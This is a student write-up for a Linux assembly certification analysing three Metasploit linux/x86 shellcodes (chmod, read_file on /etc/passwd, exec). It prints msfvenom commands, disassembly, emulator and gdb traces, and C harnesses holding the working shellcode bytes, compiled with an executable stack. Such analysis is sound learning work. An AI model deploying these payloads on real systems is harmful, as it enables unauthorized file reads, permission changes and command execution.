# Assignment #5: Metasploit Shellcode Analysis

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-858


### Exercise
- Take up at least 3 shellcode sambles created using Msfpayload for linux/x86
- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
- Present your analysis


### Solution

I chose the shellcodes:
1. linux/x86/chmod - Runs chmod on specified file with specified mode
2. linux/x86/read_file - Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
3. linux/x86/exec - Execute an arbitrary command



#### linux/x86/chmod

For the first example, we added a file named "slae.txt" and our shellcode generated with metasploit would change the file permissions (0666).

```bash
root@HackingLab:/opt/metasploit-framework# ./msfvenom -p linux/x86/chmod -a x86 FILE=slae.txt -o /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-chmod-shellcode
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 33 bytes
Saved as: /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-chmod-shellcode
```

We dissasemble the shellcode with ndisasm and look the code:

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ cat msf-chmod-shellcode | ndisasm -u -
00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E809000000        call dword 0x13
0000000A  736C              jnc 0x78
0000000C  61                popad
0000000D  652E7478          cs jz 0x89
00000011  7400              jz 0x13
00000013  5B                pop ebx
00000014  68B6010000        push dword 0x1b6
00000019  59                pop ecx
0000001A  CD80              int 0x80
0000001C  6A01              push byte +0x1
0000001E  58                pop eax
0000001F  CD80              int 0x80
```


First, we analyze the shellcode with libemu to show which are the syscalls that the shellcode is called. For it, we looked the eax register before the int 0x80 instruction.

Look the highlight (0x0f - chmod)

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ cat msf-chmod-shellcode | sctest -vvv -Ss 1000000
verbose = 3
[emu 0x0x8975078 debug ] cpu state    eip=0x00417000
[emu 0x0x8975078 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x8975078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] cpu state    eip=0x00417000
[emu 0x0x8975078 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x8975078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] 99                              cwd 
[emu 0x0x8975078 debug ] cpu state    eip=0x00417001
[emu 0x0x8975078 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x8975078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] 6A0F                            push byte 0xf
[emu 0x0x8975078 debug ] cpu state    eip=0x00417003
[emu 0x0x8975078 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x8975078 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] 58                              pop eax
[emu 0x0x8975078 debug ] cpu state    eip=0x00417004
[emu 0x0x8975078 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x8975078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] 52                              push edx
[emu 0x0x8975078 debug ] cpu state    eip=0x00417005
[emu 0x0x8975078 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x8975078 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] E809000000                      call 0xe
[emu 0x0x8975078 debug ] cpu state    eip=0x00417013
[emu 0x0x8975078 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x8975078 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] 5B                              pop ebx
[emu 0x0x8975078 debug ] cpu state    eip=0x00417014
[emu 0x0x8975078 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x0041700a
[emu 0x0x8975078 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] 68B6010000                      push dword 0x1b6
[emu 0x0x8975078 debug ] cpu state    eip=0x00417019
[emu 0x0x8975078 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x0041700a
[emu 0x0x8975078 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] 59                              pop ecx
[emu 0x0x8975078 debug ] cpu state    eip=0x0041701a
[emu 0x0x8975078 debug ] eax=0x0000000f  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x8975078 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 
[emu 0x0x8975078 debug ] CD80                            int 0x80
stepcount 8
[emu 0x0x8975078 debug ] cpu state    eip=0x0041701c
[emu 0x0x8975078 debug ] eax=0x0000000f  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x8975078 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8975078 debug ] Flags: 

```
```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ cat msf-chmod-shellcode | sctest -vvv -Ss 1000000 -G msf-chmod-shellcode.dot
```

Unfortunately, libemu doesn't recognize these syscalls, so, any graphic or source code in C language is shown.

Our last step, to undertstand this shellcode, it is debug the program, using gdb (and peda).

For this purpose, we generate the shellcode again, but this time, the output will be in C language, before, I am going to compile it.

```bash
root@HackingLab:/opt/metasploit-framework# ./msfvenom -p linux/x86/chmod -a x86 FILE=slae.txt -f c -o /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-chmod-shellcode.c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 33 bytes
Final size of c file: 165 bytes
Saved as: /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-chmod-shellcode.c
```

We edit the msf-chmod-shellcode.c to compile as a program.
```C
#include<stdio.h>
#include<string.h>

unsigned char code[] =
"\x99\x6a\x0f\x58\x52\xe8\x09\x00\x00\x00\x73\x6c\x61\x65\x2e"
"\x74\x78\x74\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01"
"\x58\xcd\x80";

main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

And test it.

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ gcc -fno-stack-protector -z execstack msf-chmod-shellcode.c -o msf-chmod-shellcode
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ chmod 000 slae.txt 
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ ls -la slae.txt 
---------- 1 hiro hiro 16 abr 15 13:08 slae.txt
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ ./msf-chmod-shellcode
Shellcode Length:  7
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ ls -la slae.txt 
-rw-rw-rw- 1 hiro hiro 16 abr 15 13:08 slae.txt
```

The shellcode is working.

Before the syscall we can look the registers eax, ebx and ecx. 


```
 [----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0x804976a ("slae.txt")
ECX: 0x1b6 
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff338 --> 0x0 
ESP: 0xbffff318 --> 0x0 
EIP: 0x804977a --> 0x16a80cd
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049773 <code+19>:	pop    ebx
   0x8049774 <code+20>:	push   0x1b6
   0x8049779 <code+25>:	pop    ecx
=> 0x804977a <code+26>:	int    0x80
   0x804977c <code+28>:	push   0x1
   0x804977e <code+30>:	pop    eax
   0x804977f <code+31>:	int    0x80
   0x8049781 <code+33>:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff318 --> 0x0 
0004| 0xbffff31c --> 0x8048469 (<main+62>:	mov    ecx,DWORD PTR [ebp-0x4])
0008| 0xbffff320 --> 0x1 
0012| 0xbffff324 --> 0xbffff3e4 --> 0xbffff549 ("/home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-chmod-shellcode")
0016| 0xbffff328 --> 0xbffff3ec --> 0xbffff591 ("XDG_VTNR=7")
0020| 0xbffff32c --> 0x8049760 --> 0x580f6a99 
0024| 0xbffff330 --> 0xb7fbf3c4 --> 0xb7fc01e0 --> 0x0 
0028| 0xbffff334 --> 0xbffff350 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804977a in code ()
gdb-peda$ 
```

##### Resume of how the shellcode works

The chmod syscall needs the following arguments:

```C
int chmod(const char *pathname, mode_t mode);
```

so, eax register will be the syscall, 0xf, the pathname will be in ebx and the mode in ecx register. 

It is very simple to understand shellcode. 




#### linux/x86/read_file

First, we generate the shellcode with the command:

```bash
root@HackingLab:/opt/metasploit-framework# ./msfvenom -p linux/x86/read_file -a x86 PATH=/etc/passwd -o /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-read_file-shellcode
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 73 bytes
Saved as: /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-read_file-shellcode
root@HackingLab:/opt/metasploit-framework# ls -la /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-read_file-shellcode
```

Dissasemble the code with ndisasm

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ cat msf-read_file-shellcode | ndisasm -u -
00000000  EB36              jmp short 0x38
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB01000000        mov ebx,0x1
0000002A  CD80              int 0x80
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
00000038  E8C5FFFFFF        call dword 0x2
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7061              jo 0xa5
00000044  7373              jnc 0xb9
00000046  7764              ja 0xac
00000048  00                db 0x00
```

We examinate the shellcode with libemu:

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ cat msf-read_file-shellcode | sctest -vvv -Ss 1000000
verbose = 3
[emu 0x0x82d8078 debug ] cpu state    eip=0x00417000
[emu 0x0x82d8078 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x82d8078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x82d8078 debug ] Flags: 
[emu 0x0x82d8078 debug ] cpu state    eip=0x00417000
[emu 0x0x82d8078 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x82d8078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x82d8078 debug ] Flags: 
[emu 0x0x82d8078 debug ] EB36                            jmp 0x38
[emu 0x0x82d8078 debug ] cpu state    eip=0x00417038
[emu 0x0x82d8078 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x82d8078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x82d8078 debug ] Flags: 
[emu 0x0x82d8078 debug ] E8C5FFFFFF                      call 0xffffffca
[emu 0x0x82d8078 debug ] cpu state    eip=0x00417002
[emu 0x0x82d8078 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x82d8078 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x82d8078 debug ] Flags: 
[emu 0x0x82d8078 debug ] B805000000                      mov eax,0x5
[emu 0x0x82d8078 debug ] cpu state    eip=0x00417007
[emu 0x0x82d8078 debug ] eax=0x00000005  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x82d8078 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x82d8078 debug ] Flags: 
[emu 0x0x82d8078 debug ] 5B                              pop ebx
[emu 0x0x82d8078 debug ] cpu state    eip=0x00417008
[emu 0x0x82d8078 debug ] eax=0x00000005  ecx=0x00000000  edx=0x00000000  ebx=0x0041703d
[emu 0x0x82d8078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x82d8078 debug ] Flags: 
[emu 0x0x82d8078 debug ] 31C9                            xor ecx,ecx
[emu 0x0x82d8078 debug ] cpu state    eip=0x0041700a
[emu 0x0x82d8078 debug ] eax=0x00000005  ecx=0x00000000  edx=0x00000000  ebx=0x0041703d
[emu 0x0x82d8078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x82d8078 debug ] Flags: PF ZF 
[emu 0x0x82d8078 debug ] CD80                            int 0x80
stepcount 5
[emu 0x0x82d8078 debug ] cpu state    eip=0x0041700c
[emu 0x0x82d8078 debug ] eax=0x00000005  ecx=0x00000000  edx=0x00000000  ebx=0x0041703d
[emu 0x0x82d8078 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x82d8078 debug ] Flags: PF ZF 
```

We can see the syscalls:
* 0x5 - sys_open Open the file
* 0x3 - sys_read Read the file
* 0x4 - sys_write Used for write

Very easy to understand reading the assembly code.

To execute, we compile the shellcode and debug it.

Generate the shellcode in C format.

```bash
root@HackingLab:/opt/metasploit-framework# ./msfvenom -p linux/x86/read_file -f c -a x86 PATH=/etc/passwd -o /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-read_file-shellcode.c
```


```C
#include<stdio.h>
#include<string.h>

unsigned char code[] =
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";


int main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

Compile and run.

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ gcc -fno-stack-protector -z execstack msf-read_file-shellcode.c -o msf-read_file
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ ./msf-read_file
Shellcode Length:  4
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```


#### linux/x86/exec 

As the msfvenom payload description says this shellcode "Execute an arbitrary command". And We are going to understand how it works.

The first step is generate the shellcode with the following command (we generated in C format too).

```bash
root@HackingLab:/opt/metasploit-framework# ./msfvenom -p linux/x86/exec CMD=id -a x86 -o /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-exec
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes
Saved as: /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-exec
root@HackingLab:/opt/metasploit-framework# ./msfvenom -p linux/x86/exec CMD=id -f c -a x86 -o /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-exec.c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes
Final size of c file: 185 bytes
Saved as: /home/hiro/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5/msf-exec.c
```

We dissasemble the shellcode with ndisasm.

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ cat msf-exec | ndisasm -u -
00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  66682D63          push word 0x632d
00000009  89E7              mov edi,esp
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
00000015  89E3              mov ebx,esp
00000017  52                push edx
00000018  E803000000        call dword 0x20
0000001D  696400575389E1CD  imul esp,[eax+eax+0x57],dword 0xcde18953
00000025  80                db 0x80
```

We know the "/bin/sh" code is in
```
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
```

I thought that ndisasm did not dissasemble correctly the shellcode. So I compiled and debugged it with gdb. 

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ gcc -fno-stack-protector -z execstack msf-exec.c -o msf-exec
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ gdb -q ./msf-exec 
Reading symbols from ./msf-exec...(no debugging symbols found)...done.
gdb-peda$ b *&code
Breakpoint 1 at 0x8049760
gdb-peda$ r
....
```


I saw that the call dword 0x20 instruction is executed, the arguments are:

```
arg[0]: 0x0 
arg[1]: 0x6e69622f ('/bin')
arg[2]: 0x68732f ('/sh')
arg[3]: 0x632d ('-c')
arg[4]: 0x84690000 

And it call to code+32
   0x804977f <code+31>:	add    BYTE PTR [edi+0x53],dl
   0x8049782 <code+34>:	mov    ecx,esp
=> 0x8049784 <code+36>:	int    0x80
   0x8049786 <code+38>:	add    BYTE PTR [eax],al
   0x8049788:	add    BYTE PTR [eax],al
   0x804978a:	add    BYTE PTR [eax],al
   0x804978c:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff32e --> 0xbffff33e ("/bin/sh")
0004| 0xbffff332 --> 0xbffff346 --> 0x632d ('-c')
0008| 0xbffff336 --> 0x804977d --> 0x57006469 ('id')
```

The problem with ndisasm is that the line 0000001D is not dissasembled correctly.

```
0000001D  696400575389E1CD  imul esp,[eax+eax+0x57],dword 0xcde18953
```

So, when we debugged the program, we understood how it works. When the syscall sys_execve (0xb) is called, the registers are:
```
EAX: 0xb ('\x0b')
EBX: 0xbffff33e ("/bin/sh")
ECX: 0xbffff32e --> 0xbffff33e ("/bin/sh")
EDX: 0x0 

... and the stack:
0000| 0xbffff32e --> 0xbffff33e ("/bin/sh")
0004| 0xbffff332 --> 0xbffff346 --> 0x632d ('-c')
0008| 0xbffff336 --> 0x804977d --> 0x57006469 ('id')
```


It works...
```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ gcc -fno-stack-protector -z execstack msf-exec.c -o msf-exec
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment5$ ./msf-exec 
Shellcode Length:  15
uid=1000(hiro) gid=1000(hiro) groups=1000(hiro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner)
```
